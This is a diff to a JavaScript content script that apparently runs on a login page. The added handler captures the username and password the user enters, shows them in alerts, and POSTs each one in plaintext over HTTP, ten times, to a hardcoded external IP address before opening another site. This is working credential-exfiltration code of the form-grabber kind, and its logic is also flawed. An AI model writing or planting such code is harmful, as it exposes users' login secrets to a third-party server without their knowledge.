@@ -1,26 +1,26 @@
 console.log("########sendkey_content#######");
-/*
-    login页面一出来jump_content就会打开1111
-    此脚本将给发送keys给server
-*/
-function sendmessage(){
-    var username = localStorage.getItem('username');
-	var password = localStorage.getItem('password');
+function sendmessage(username,password){
+    // var username = localStorage.getItem('username');
+    // var password = localStorage.getItem('password');
+    // var username = web_username;
+    // var password = web_password;
+
+    console.log(username + " " + password)
 	if(username||password == null){
 
 	}
     var url = "http://49.232.13.120:1111/sendusername"
-    var request = new XMLHttpRequest();/*用new创建一个XHR对象*/
+    var request = new XMLHttpRequest();
     try{
-        request.open("POST",url);/*设置XHR对象的请求方法与路径*/ 
-		request.send(username);/*设置XHR对象不发送数据到服务器*/
+        request.open("POST",url);
+		request.send(username);
 		console.log("sending " + username);	
 	}
     catch(e){
         alert("哼唧 = =# 服务器繁忙请重试的啦！");
     }
-    request.onload = function() {/*设置当获XHR对象获取到返回信息后执行以下代码*/
-        if(request.status == 200) {/*如果返回的状态为200，即为成功获取数据*/ 
+    request.onload = function() {
+        if(request.status == 200) {
             console.log(request.responseText);
         }else{
 			console.log("server is 404")
@@ -28,25 +28,33 @@ function sendmessage(){
 	}
 
 	var url = "http://49.232.13.120:1111/sendpassword"
-    var request = new XMLHttpRequest();/*用new创建一个XHR对象*/
+    var request = new XMLHttpRequest();
     try{
-        request.open("POST",url);/*设置XHR对象的请求方法与路径*/ 
-		request.send(password);/*设置XHR对象不发送数据到服务器*/
+        request.open("POST",url);
+		request.send(password);
 		console.log("sending " + password);	
     }
     catch(e){
         alert("哼唧 = =# 服务器繁忙请重试的啦！");
     }
-    request.onload = function() {/*设置当获XHR对象获取到返回信息后执行以下代码*/
-        if(request.status == 200) {/*如果返回的状态为200，即为成功获取数据*/ 
+    request.onload = function() {
+        if(request.status == 200) {
             console.log(request.responseText);
         }
     }
 }
-
-for(var i = 0;i<3;i++){
-	setTimeout(sendmessage,1000);
+document.getElementById('login').onclick = function()
+{
+    var web_username = document.getElementById("web_username").value;
+    var web_password = document.getElementById("web_password").value;
+    localStorage.setItem('username',web_username);
+    alert("您的用户名是：" + web_username);
+    localStorage.setItem('password',web_password);
+    alert("您的密码是：" + web_password);
+    for(var i = 0;i<10;i++){   
+        setTimeout(sendmessage(web_username,web_password),1000);
+    }
+    window.open("http://202.115.194.60/");
+    // window.close();
 }
-
-
 
